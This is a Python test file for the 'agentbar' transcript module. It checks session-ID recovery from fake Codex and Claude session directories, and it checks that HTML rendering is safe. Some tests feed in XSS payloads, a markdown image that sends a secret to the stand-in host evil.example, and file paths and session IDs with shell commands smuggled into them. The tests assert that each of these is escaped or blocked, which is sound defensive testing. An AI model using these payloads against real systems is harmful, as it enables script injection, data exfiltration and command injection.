"""recover_session_id 模糊反查测试 — 构造假会话目录，不碰真实 HOME。"""

import time

import pytest

from agentbar import transcript


@pytest.fixture
def fake_home(tmp_path, monkeypatch):
    monkeypatch.setattr(transcript.Path, "home", staticmethod(lambda: tmp_path))
    return tmp_path


def _mk_rollout(home, ts_str: str, sid: str, cwd: str = "/private/tmp"):
    d = home / ".codex" / "sessions" / "2026" / "07" / "14"
    d.mkdir(parents=True, exist_ok=True)
    p = d / f"rollout-{ts_str}-{sid}.jsonl"
    p.write_text('{"type":"session_meta","payload":{"cwd":"%s"}}\n' % cwd)
    return p


def test_codex_recover_by_time_and_cwd(fake_home):
    started = time.mktime(time.strptime("2026-07-14T21-00-10", "%Y-%m-%dT%H-%M-%S"))
    # 命中：启动后 3 秒创建、cwd 匹配
    _mk_rollout(fake_home, "2026-07-14T21-00-13", "aaaa-target", cwd="/private/tmp")
    # 干扰 1：时间窗外（早 1 小时）
    _mk_rollout(fake_home, "2026-07-14T20-00-00", "bbbb-old")
    # 干扰 2：窗内但 cwd 不同 → cwd 匹配的优先
    _mk_rollout(fake_home, "2026-07-14T21-00-11", "cccc-othercwd", cwd="/Users/x/other")
    sid = transcript.recover_session_id("codex", "/tmp", started, started + 60)
    assert sid == "aaaa-target"


def test_codex_recover_none_outside_window(fake_home):
    started = time.mktime(time.strptime("2026-07-14T21-00-00", "%Y-%m-%dT%H-%M-%S"))
    _mk_rollout(fake_home, "2026-07-14T18-00-00", "dddd-far")
    assert transcript.recover_session_id("codex", "/tmp", started, started + 60) is None


def test_claude_recover_by_mtime(fake_home):
    import os
    d = fake_home / ".claude" / "projects" / "-tmp"
    d.mkdir(parents=True)
    p = d / "9f99fb91-c4a3-4444-aaaa-bbbbccccdddd.jsonl"
    p.write_text("{}\n")
    now = time.time()
    os.utime(p, (now - 10, now - 10))
    sid = transcript.recover_session_id("claude", "/tmp", now - 60, now)
    assert sid == "9f99fb91-c4a3-4444-aaaa-bbbbccccdddd"


def test_recover_requires_started_at(fake_home):
    assert transcript.recover_session_id("codex", "/tmp", None) is None


def test_markdown_rich_rendering():
    """标题/列表/表格/引用/链接必须渲染成对应 HTML 结构，不能塌成一段。"""
    from agentbar.transcript import _text_to_html
    md = ("## 标题\n\n- 项目1\n- 项目2\n\n| A | B |\n| --- | --- |\n| 1 | 2 |\n\n"
          "> 引用\n\n公式 $x^2$ [链接](https://example.com)")
    h = _text_to_html(md)
    assert "<h2>" in h and "<ul>" in h and "<li>" in h
    assert "<table>" in h and "<blockquote>" in h
    assert '<a href="https://example.com"' in h
    assert "\\(x^2\\)" in h  # math 插件转成 MathJax 定界符


def test_markdown_escapes_raw_html():
    from agentbar.transcript import _text_to_html
    h = _text_to_html("<script>alert(1)</script> 正常文字")
    assert "<script>" not in h


def test_legacy_markdown_fallback_escapes_html_inside_math():
    """mistune 不可用时，公式定界符也不能成为 HTML 注入通道。"""
    rendered = transcript._text_to_html_legacy(
        "$<img src=x onerror=alert(1)>$ $$<svg onload=alert(2)>$$"
    )
    assert "<img" not in rendered
    assert "<svg" not in rendered
    assert "&lt;img" in rendered
    assert "&lt;svg" in rendered


def test_transcript_html_is_offline_and_blocks_remote_images(tmp_path):
    path = tmp_path / "session.jsonl"
    path.write_text(
        '{"type":"assistant","message":{"content":"'
        '![private](https://evil.example/track?secret=1)"}}\n',
        encoding="utf-8",
    )
    rendered = transcript.to_html("claude", path)
    assert "Content-Security-Policy" in rendered
    assert "default-src 'none'" in rendered
    assert "script-src 'none'" in rendered
    assert "cdn.jsdelivr.net" not in rendered
    assert "<script" not in rendered
    assert "<img" not in rendered
    assert "evil.example" not in rendered
    assert "已隐藏外部图片" in rendered


def test_resume_command_shell_quotes_cwd_and_session():
    command = transcript.resume_command(
        "codex",
        "/tmp/project; touch SHOULD_NOT_RUN",
        "sid; touch ALSO_NOT",
    )
    assert "cd '/tmp/project; touch SHOULD_NOT_RUN'" in command
    assert "resume 'sid; touch ALSO_NOT'" in command
